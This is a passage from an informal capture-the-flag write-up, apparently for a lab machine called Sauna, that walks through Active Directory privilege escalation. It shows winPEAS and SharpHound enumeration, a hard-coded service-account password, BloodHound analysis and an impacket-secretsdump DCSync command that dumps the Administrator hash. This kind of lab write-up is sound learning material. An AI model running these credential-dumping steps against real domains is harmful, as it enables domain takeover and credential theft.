...
im gonna go ahead and upload winPEASx64.exe
`upload winPEASx64.exe`

inside we find a lot of data, carefully scrolling through:
```
...
lets check svc_loanmanager permissions:
```
$cred = New-Object PSCredential('EGOTISTICALBANK\svc_loanmanager',(ConvertTo-SecureString 'Moneymakestheworldgoround!' -AsPlainText -Force))

Enter-PSSession -ComputerName dc.egotisticalbank.local -Credential $cred
```

but not working cause i already am in session

i am just gonna upload sharphound:
```
/SharpHound.exe -c All -d EGOTISTICAL-BANK.LOCAL --ZipFileName sauna-loot.zip
```

i assume the above would have pottentially worked if i used right domain..... i will check back later to confirm but now that we have the zip:
```
download sauna-loot.zip
```

and upload to bloodhound for hopefully some info on how to exploit!

![[Pasted image 20250827192357.png]]

upon looking more into svc_loanmgr we can see that they have an outbound object control ChangesAll which is def our exploit using a DCSync attack!

```
impacket-secretsdump -just-dc-user Administrator 'EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175
```
